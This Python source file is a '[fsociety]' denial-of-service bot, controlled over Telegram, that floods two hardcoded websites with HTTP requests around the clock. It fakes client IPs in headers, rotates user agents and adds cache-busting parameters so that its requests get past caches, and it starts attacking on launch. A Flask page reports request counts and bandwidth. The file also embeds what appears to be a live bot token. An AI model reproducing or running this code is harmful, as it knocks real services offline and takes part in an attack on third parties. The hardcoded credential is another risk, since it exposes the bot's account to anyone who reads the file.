#!/usr/bin/env python3
"""
[fsociety] 24/7 Auto DDoS Controller - Railway Optimized
"""

import os
import sys
import time
import threading
import random
import string
import requests
from datetime import datetime
from flask import Flask, request, jsonify
import telegram
from telegram.ext import Updater, CommandHandler, Dispatcher

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8897529808:AAFOr23D_uNaJy5dGjPcPdvC8D1se9e49nc")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7898928200"))  # Your Telegram user ID

TARGETS = {
    "main": "https://emote-web-shadow.vercel.app",
    "key": "https://shadowxmods.alwaysdata.net",
}

AUTO_TARGET = os.environ.get("AUTO_TARGET", "main")
ATTACK_THREADS = int(os.environ.get("ATTACK_THREADS", "300"))

# Attack state
attack_active = True
stats = {
    "total_requests": 0,
    "bandwidth_mb": 0,
    "errors": 0,
    "start_time": datetime.now(),
    "target": TARGETS.get(AUTO_TARGET, TARGETS["main"])
}

# Flask app
app = Flask(__name__)

# ========== UTILITIES ==========
def random_string(n=10):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=n))

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cache-Control": "no-cache, no-store",
        "X-Forwarded-For": random_ip(),
        "Connection": "keep-alive"
    }

def generate_cache_buster():
    return f"_cb={random_string(16)}&_t={int(time.time()*1000000)}"

# ========== ATTACK ENGINE ==========
def attack_worker():
    global stats, attack_active
    
    session = requests.Session()
    target = stats["target"]
    
    print(f"[🔥] Attack started on {target}")
    
    while attack_active:
        try:
            paths = ["/", "/api", "/key", "/getkey", "/generate", "/auth", "/verify", "/check"]
            path = random.choice(paths)
            cache_buster = generate_cache_buster()
            url = f"{target}{path}?{cache_buster}"
            
            headers = random_headers()
            resp = session.get(url, headers=headers, timeout=5)
            
            content_len = len(resp.content)
            stats["total_requests"] += 1
            stats["bandwidth_mb"] += content_len / (1024 * 1024)
            
            if stats["total_requests"] % 500 == 0:
                print(f"[📊] {stats['total_requests']:,} reqs | {stats['bandwidth_mb']/1024:.2f}GB")
                
        except Exception as e:
            stats["errors"] += 1

def start_attack():
    global attack_active
    attack_active = True
    thread = threading.Thread(target=attack_worker, daemon=True)
    thread.start()
    print("[✅] Attack thread started")

def stop_attack():
    global attack_active
    attack_active = False

# ========== TELEGRAM HANDLERS ==========
def start_command(update, context):
    update.message.reply_text("""
🔥 [fsociety] 24/7 DDoS Bot

Commands:
/status - Live attack stats
/stop - Stop attack (admin)
/resume - Resume attack (admin)
/target <main|key> - Switch target
/help - This menu

Status: 🔴 ATTACKING 24/7
""")

def status_command(update, context):
    elapsed = (datetime.now() - stats["start_time"]).total_seconds()
    rps = stats["total_requests"] / elapsed if elapsed > 0 else 0
    bw_gb = stats["bandwidth_mb"] / 1024
    
    msg = f"""
🔥 LIVE STATUS

🎯 Target: {stats['target']}
📊 Requests: {stats['total_requests']:,}
💾 Bandwidth: {bw_gb:.2f} GB
⚡ Rate: {rps:.1f} req/s
⏱️ Duration: {elapsed/3600:.1f} hours
💀 Errors: {stats['errors']}

Status: 🔴 ATTACKING
"""
    update.message.reply_text(msg)

def stop_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    stop_attack()
    update.message.reply_text("⏸️ Attack stopped. Use /resume to start.")

def resume_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    start_attack()
    update.message.reply_text("🔥 Attack resumed!")

def target_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        update.message.reply_text(f"Current: {stats['target']}\nOptions: main, key")
        return
    if context.args[0] in TARGETS:
        stats["target"] = TARGETS[context.args[0]]
        stats["total_requests"] = 0
        stats["bandwidth_mb"] = 0
        stats["start_time"] = datetime.now()
        update.message.reply_text(f"✅ Target switched to {stats['target']}")
    else:
        update.message.reply_text("❌ Invalid target")

# ========== FLASK WEBHOOK ==========
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        update = telegram.Update.de_json(request.get_json(force=True), bot)
        dispatcher.process_update(update)
    return 'ok'

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "attack_active": attack_active,
        "total_requests": stats["total_requests"],
        "bandwidth_gb": round(stats["bandwidth_mb"] / 1024, 2),
        "target": stats["target"]
    })

@app.route('/stats')
def stats_page():
    elapsed = (datetime.now() - stats["start_time"]).total_seconds()
    rps = stats["total_requests"] / elapsed if elapsed > 0 else 0
    return f"""
    <html><head><title>Attack Stats</title>
    <meta http-equiv="refresh" content="3">
    <style>body{{background:#000;color:#0f0;font-family:monospace;padding:20px;}}</style>
    </head><body>
    <h1>🔥 [fsociety] Attack Dashboard</h1>
    <div>Requests: {stats['total_requests']:,}</div>
    <div>Bandwidth: {stats['bandwidth_mb']/1024:.2f} GB</div>
    <div>Rate: {rps:.0f} req/s</div>
    <div>Target: {stats['target']}</div>
    </body></html>
    """

# ========== MAIN ==========
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set!")
        sys.exit(1)
    
    # Setup bot (webhook only - no polling)
    bot = telegram.Bot(token=BOT_TOKEN)
    dispatcher = Dispatcher(bot, None, use_context=True)
    
    # Register commands
    dispatcher.add_handler(CommandHandler("start", start_command))
    dispatcher.add_handler(CommandHandler("status", status_command))
    dispatcher.add_handler(CommandHandler("stop", stop_command))
    dispatcher.add_handler(CommandHandler("resume", resume_command))
    dispatcher.add_handler(CommandHandler("target", target_command))
    dispatcher.add_handler(CommandHandler("help", start_command))
    
    # Start attack thread
    start_attack()
    
    # Start Flask
    port = int(os.environ.get("PORT", 8080))
    print(f"[✅] Bot started! Send /start on Telegram")
    print(f"[✅] Webhook URL: https://your-app.up.railway.app/webhook/{BOT_TOKEN}")
    print(f"[🔥] Attack running on {stats['target']}")
    
    app.run(host='0.0.0.0', port=port)